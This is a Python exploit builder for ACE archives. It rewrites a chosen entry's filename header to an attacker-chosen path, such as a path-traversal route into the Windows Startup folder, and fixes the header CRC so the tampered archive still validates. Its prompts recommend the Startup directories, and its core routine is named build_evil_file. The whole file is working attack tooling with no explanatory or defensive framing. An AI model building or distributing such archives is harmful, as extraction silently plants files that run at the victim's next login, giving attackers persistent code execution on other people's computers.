#!/usr/bin/env python3
# -*- coding: ascii -*-
import os
import re
import sys
import shutil
import struct
import time

#p = os.popen('py -3 acefile.py --headers %s'%(filename))
#    res = p.read()
file_list=[]
hdr_size=[]
file_size=[]
file_idx=-1
dir_name=""
file_name=""
bak_name=""
def check_py3():
    p = os.popen('py -3 --version')
    res = p.read()
    #print (res)
    if "Python 3" not in res:
        return False
    else:
        return True

def read_file_list(filename):

    ### file name list
    p = os.popen('py -3 acefile.py --headers %s'%(filename))
    res = p.read()
    pattern = re.compile("filename    b'(.*?)'")
    result = pattern.findall(res)
    
    for i in range(0,len(result)):
        file_list.append(result[i].replace("\\\\",'\\'))
    #print (file_list)

    ### header size
    pattern = re.compile("hdr_size(.*?)\n")
    result = pattern.findall(res)
    #print (result)
    for i in range(0,len(result)):
        hdr_size.append(int(result[i]))
    #print (hdr_size)

    ### file size
    pattern = re.compile("packsize(.*?)\n")
    result = pattern.findall(res)
    #print (result)
    for i in range(0,len(result)):
        file_size.append(int(result[i]))
    #print (file_size)
    
def choose_file():
    global file_idx
    print ("File list:")
    for i in range(len(file_list)):
        print("\t%d : %s"%(i,file_list[i]))
    file_idx=int(input("input file index want to handle: "))
    #print (file_list[file_idx])
    
    if file_idx>=len(file_list) or file_idx <0:
        print("invalid choice")
        exit(1)

def input_dir():
    global dir_name
    print ("input dir you want to put the file")
    print ("    recommend:")
    print ("        C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
    print ("        C:\\Users\\<user name>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    print ("        C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\Startup\\")
    temp=input("> ")

    if temp[-1:]!="\\":
        temp+="\\"
    
    dir_name=temp+(file_list[file_idx].split('\\'))[-1]
    print ("file gonna be put into %s,sure?(y/n)"%(dir_name))
    stri=input("> ")
    #print (stri[0])
    if stri[0]=='y' or stri[0] == 'Y':
        if temp[:5]=="C:../":
            temp="C:"+temp
        dir_name=temp+(file_list[file_idx].split('\\'))[-1]
        return
    else:
        print ("try again")
        input_dir()
        


    
def build_file_head():
    ## build file head
    global bak_name
    global file_name
    fr=open(bak_name,"rb")
    fw=open(file_name,"wb")
    data=fr.read(4)
    fw.write(data)
    data=fr.read(hdr_size[0])
    fw.write(data)
    fr.close()
    fw.close()

def build_one_file(num):
    global bak_name
    global file_name
    fr=open(bak_name,"rb")
    fw=open(file_name,"ab+")
    offset=hdr_size[0]+4
    for i in range(0,num):
        offset+=hdr_size[i+1]+4
        offset+=file_size[i]
    fr.seek(offset,0)
    data=fr.read(4)
    fw.write(data)
    data=fr.read(hdr_size[num+1])
    fw.write(data)
    data=fr.read(file_size[num])
    fw.write(data)
    fr.close()
    fw.close()

def get_right_hdr_crc():
    # This command may be different, it depends on the your Python3 environment.
    p = os.popen('py -3 acefile.py --headers %s'%("tmp"))
    res = p.read()
    #print (res)
    pattern = re.compile('right_hdr_crc : (.*?) | struct')
    result = pattern.findall(res)
    right_hdr_crc = int(result[0],16)
    #print (hex(right_hdr_crc))
    return right_hdr_crc


def build_evil_file(num):
    global bak_name
    global file_name
    global dir_name
    shutil.copyfile(file_name,"tmp")
    time.sleep(3)
    #input("wait")
    
    fr=open(bak_name,"rb")
    
    fw=open("tmp","ab+")
    offset=hdr_size[0]+4
    for i in range(0,num):
        offset+=hdr_size[i+1]+4
        offset+=file_size[i]
    fr.seek(offset+4,0)
    size=hdr_size[num+1]-len(file_list[num])
    #print (file_list[num])
    size+=len(dir_name)
    #print (size,len(file_list[num]),len(file_name),str(struct.pack("<H",size)))
    data=struct.pack("<H",0x9999)+struct.pack("<h",size)

    
    fw.write(data)
    
    
    #fw.write(data)
    data=fr.read(hdr_size[num+1])
    #print (hdr_size[num+1],len(data),type(data))
    wdata=data[:data.find(bytes(file_list[num].encode("ascii")))-2]
    wdata+=struct.pack("<H",len(dir_name))
    wdata+=bytes(dir_name.encode("ascii"))

    #wdata+=data[(data.find(bytes(file_list[num].encode("ascii")))+len(file_list[num])):-2]
    #print (data)
    #wdata+=struct.pack("<H",len(file_name))
    #print (len(wdata),file_name)
    fw.write(wdata)

    data=fr.read(file_size[num])
    fw.write(data)
    fr.close()
    fw.close()
    #fw.close()

    
    ## revise the crc
    
    hdr_crc=get_right_hdr_crc()
    
    
    fr=open(bak_name,"rb")
    
    fw=open(file_name,"ab+")
    offset=hdr_size[0]+4
    for i in range(0,num):
        offset+=hdr_size[i+1]+4
        offset+=file_size[i]

        
    fr.seek(offset+4,0)
    size=hdr_size[num+1]-len(file_list[num])
    #print (file_list[num])
    size+=len(dir_name)
    #print (size,len(file_list[num]),len(file_name),str(struct.pack("<H",size)))
    data=struct.pack("<H",hdr_crc)+struct.pack("<H",size)

    
    fw.write(data)
    
    
    #fw.write(data)
    data=fr.read(hdr_size[num+1])
    #print (hdr_size[num+1],len(data),type(data))
    wdata=data[:data.find(bytes(file_list[num].encode("ascii")))-2]
    wdata+=struct.pack("<H",len(dir_name))
    wdata+=bytes(dir_name.encode("ascii"))

    #wdata+=data[(data.find(bytes(file_list[num].encode("ascii")))+len(file_list[num])):-2]
    #print (data)
    #wdata+=struct.pack("<H",len(file_name))
    #print (len(wdata),file_name)
    fw.write(wdata)

    data=fr.read(file_size[num])
    fw.write(data)
    fr.close()
    fw.close()
    os.remove("tmp")
    
def generate_file():
    print ("generating....")
    build_file_head()
    
    for i in range(0,len(file_list)):
        if i == file_idx:
            #pass
            build_evil_file(i)
        else:
            build_one_file(i)

    print ("finish....")
if __name__ == '__main__':
    if not check_py3():
        print ("Script should be run with python3, you need install python3 first.")
        exit(1)
    #print (len(sys.argv))
    #print (sys.argv[0],sys.argv[1])
    if len(sys.argv)!=2:
        print ("usage: py -3 %s filename"%(sysargv[0]))
        exit(1)
    
     
    file_name=sys.argv[1]
    bak_name=file_name+".bak"
    
    shutil.copyfile(file_name,bak_name)
    time.sleep(2)
    os.remove(file_name)
    read_file_list(bak_name)
    choose_file()
    input_dir()
    generate_file()

    
	
